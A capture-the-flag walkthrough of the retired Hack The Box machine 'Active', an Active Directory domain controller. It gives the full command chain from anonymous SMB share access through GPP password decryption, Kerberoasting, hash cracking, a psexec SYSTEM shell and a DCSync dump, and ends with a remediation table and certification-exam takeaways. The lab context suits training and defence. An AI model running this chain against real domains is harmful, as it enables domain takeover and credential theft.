# Active — A retired classic: GPP passwords to Domain Admin

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/active)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/active)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=jUc1J31DNdw)

> **Attack path:** Anonymous SMB on the `Replication` (SYSVOL) share → GPP `cpassword` in `Groups.xml` → `gpp-decrypt` → `SVC_TGS` credentials → Kerberoast the **Administrator** account → crack → `psexec.py` SYSTEM shell.

One of the most iconic easy AD boxes ever retired, and the fastest full-domain compromise in the playlist: two flag-worthy misconfigurations (GPP passwords + a kerberoastable admin) stacked back to back.

## 1 · Reconnaissance

```bash
echo "10.10.10.100 active.htb" | sudo tee -a /etc/hosts

nmap -p- --min-rate 10000 -oN active-allports 10.10.10.100
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV -oN active-tcpsvc 10.10.10.100
```

A Windows Server 2008 R2 domain controller for `active.htb` — the usual DC port set (Kerberos 88, LDAP, SMB 445, WinRM 5985).

### Anonymous SMB access to SYSVOL

```bash
smbmap -H 10.10.10.100
```

```text
disk  Permissions  Comment
----  -----------  -------
Replication  READ        # world-readable copy of SYSVOL
```

That share alone is enough to compromise the domain — exactly why IppSec starts here.

## 2 · Foothold

### Pulling Group Policy Preferences

Mount the share and go fishing in the GPP area:

```bash
smbclient //10.10.10.100/Replication -U ""%""
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

The treasure is in the Groups.xml preference file:

```text
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
```

```xml
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User name="active.htb\SVC_TGS" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" ... />
</Groups>
```

### gpp-decrypt

Microsoft published the AES key used for every GPP `cpassword`, so "encryption" here is a formality:

```bash
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
# <password>   (SVC_TGS)
```

Validate before moving on:

```bash
netexec smb 10.10.10.100 -u svc_tgs -p '<password>' --shares
```

## 3 · User flag

`SVC_TGS` can now read the `Users` share — user.txt without ever touching a shell:

```bash
smbclient //10.10.10.100/Users -U 'active.htb\SVC_TGS%<password>'
smb: \> get SVC_TGS\desktop\user.txt
```

```text
<flag>
```

## 4 · Privilege escalation

### Kerberoasting

With any valid domain credentials you can request service tickets for accounts that own SPNs — and this domain has a fatal one:

```bash
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile GetUserSPNs.out
```

```text
ServicePrincipalName  Name           MemberOf  PasswordLastSet
active/CIFS:445       administrator            <recent>
```

The **Administrator** account itself carries an SPN — roasting it hands over its TGS hash, crackable offline:

```bash
hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt
# administrator:<password>
```

- `hashcat -m 13100` = Kerberos 5 TGS-REP etype 23 (the GetUserSPNs.py output format).

## 5 · Root flag / Domain Admin

Confirm the win, then grab root.txt straight over SMB:

```bash
netexec smb 10.10.10.100 -u administrator -p '<password>' --shares
# ADMIN$, C$, SYSVOL ... READ, WRITE

smbclient //10.10.10.100/C$ -U 'active.htb\administrator%<password>'
smb: \> get users\administrator\desktop\root.txt
```

```text
<flag>
```

And a proper SYSTEM shell via Impacket (uploads a binary to ADMIN$ and registers a service):

```bash
psexec.py active.htb/administrator@10.10.10.100
# whoami → nt authority\system
```

Encore, as IppSec shows: with Administrator you can also DCSync the entire domain:

```bash
secretsdump.py 'active.htb/administrator:<password>'@10.10.10.100 -just-dc
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
|---|---|---|
| GPP `cpassword` files in SYSVOL (MS14-025 not cleaned) | Any anonymous/low-priv user reads domain-local credentials in cleartext | Run the MS14-025 cleanup; delete old `Groups.xml`/`Services.xml` from SYSVOL and purge GPP-stored secrets (use LSA secrets or a vault instead) |
| Service account (`SVC_TGS`) with domain-wide readable shares | Credential exposure plus a foothold for Kerberoasting | Rotate the password, remove it from SYSVOL-referenced roles, apply least-privilege share ACLs |
| Administrator account with an SPN (kerberoastable) | Offline cracking of the domain admin password | Never set SPNs on privileged accounts; audit with `Get-ADUser -Filter { ServicePrincipalName -ne '$null' }` |
| Weak, rockyou-crackable passwords | Both roasting attacks cracked in minutes | Long passphrases + breached-password bans for all service/admin accounts |

## 7 · CPTS takeaways

- **Read-only SMB shares are an attack surface**: always enumerate anonymous access (`smbmap -H` with no credentials) before anything else.
- GPP password hunting (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`) and `gpp-decrypt` — a guaranteed-to-appear exam trick.
- Kerberoasting mechanics: `GetUserSPNs.py -request` → `hashcat -m 13100` → validate with netexec.
- Learn to live on SMB: both flags here can be pulled with `smbclient` alone — no shell needed.
- `psexec.py` requirements (writable ADMIN$ + SVCManager access) and when to prefer it over WinRM.
